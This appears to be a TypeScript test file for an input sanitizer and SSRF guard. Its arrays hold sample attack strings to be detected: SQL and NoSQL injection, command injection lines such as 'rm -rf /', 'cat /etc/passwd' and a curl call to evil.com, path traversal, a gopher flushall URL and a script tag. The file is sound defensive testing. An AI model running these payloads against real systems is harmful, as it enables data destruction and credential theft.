import test from 'node:test';
import assert from 'node:assert/strict';
import { inspectInput, assertSafeInput, validateOutgoingUrl, escapeHtml } from '../src/security/sanitizer.ts';
import { SecurityThreatDetectedError } from '../src/security/errors.ts';

test('Sanitizer: detects SQL injection payloads and blocks execution', () => {
  const sqlAttacks = [
    "admin' OR '1'='1",
    "1'; DROP TABLE users; --",
    "' UNION SELECT id, password, credit_card FROM accounts --",
    "SELECT * FROM secrets WHERE 1=1",
  ];

  for (const attack of sqlAttacks) {
    const inspection = inspectInput(attack);
    assert.equal(inspection.isClean, false, `Failed to detect: ${attack}`);
    assert.ok(inspection.detectedThreats.some((t) => t.type === 'SQLI'));

    assert.throws(
      () => assertSafeInput(attack, 'queryParam'),
      SecurityThreatDetectedError
    );
  }
});

test('Sanitizer: detects NoSQL query operator injection', () => {
  const nosqlAttacks = [
    '{"$where: function() { return 1; }}"}',
    'username: {"$gt: ""}',
    'role: {"$ne: "guest"}',
  ];

  for (const attack of nosqlAttacks) {
    const inspection = inspectInput(attack);
    assert.equal(inspection.isClean, false, `Failed to detect: ${attack}`);
    assert.ok(inspection.detectedThreats.some((t) => t.type === 'NOSQLI'));
  }
});

test('Sanitizer: detects OS command injection syntax', () => {
  const cmdAttacks = [
    'input.txt; rm -rf /',
    'image.png && cat /etc/passwd',
    'echo `curl https://evil.com`',
    'data.csv | bash',
  ];

  for (const attack of cmdAttacks) {
    const inspection = inspectInput(attack);
    assert.equal(inspection.isClean, false, `Failed to detect: ${attack}`);
    assert.ok(inspection.detectedThreats.some((t) => t.type === 'CMD_INJECTION'));
  }
});

test('Sanitizer: detects path traversal and null-byte attacks', () => {
  const pathAttacks = [
    '../../../../etc/passwd',
    '..%2f..%2fwindows/system32',
    'document.pdf\0.exe',
    'image.jpg%00.php',
  ];

  for (const attack of pathAttacks) {
    const inspection = inspectInput(attack);
    assert.equal(inspection.isClean, false, `Failed to detect: ${attack}`);
    assert.ok(inspection.detectedThreats.some((t) => t.type === 'PATH_TRAVERSAL'));
  }
});

test('Sanitizer: allows legitimate safe business inputs', () => {
  const safeInputs = [
    'Ahmed Al Mansoori',
    'Dubai Internet City, Building 1',
    'Abu Dhabi Investment Authority',
    'reference-code-2026-XYZ',
    'https://fortress.gov.ae/status',
  ];

  for (const safe of safeInputs) {
    const inspection = inspectInput(safe);
    assert.equal(inspection.isClean, true, `Legitimate input was falsely flagged: ${safe}`);
    assert.equal(assertSafeInput(safe), safe);
  }
});

test('SSRF Guard: blocks loopback, RFC-1918, and cloud metadata endpoints', () => {
  const forbiddenTargets = [
    'http://localhost:3000/api',
    'http://127.0.0.1:8080/secrets',
    'http://169.254.169.254/latest/meta-data/',
    'http://10.240.0.1/internal',
    'http://172.16.50.1/status',
    'http://192.168.1.254/admin',
    'ftp://example.com/file',
    'gopher://127.0.0.1:6379/_flushall',
  ];

  for (const target of forbiddenTargets) {
    const result = validateOutgoingUrl(target);
    assert.equal(result.isValid, false, `SSRF check failed to block: ${target}`);
  }

  // Legitimate public HTTPS URLs should pass
  const publicUrl = 'https://api.github.com/repos';
  const pubResult = validateOutgoingUrl(publicUrl);
  assert.equal(pubResult.isValid, true, `Legitimate URL was blocked: ${publicUrl}`);
});

test('XSS: properly escapes dangerous HTML characters', () => {
  const unescaped = '<script>alert("pwned")</script> & "quotes"';
  const escaped = escapeHtml(unescaped);
  assert.equal(escaped, '&lt;script&gt;alert(&quot;pwned&quot;)&lt;/script&gt; &amp; &quot;quotes&quot;');
});
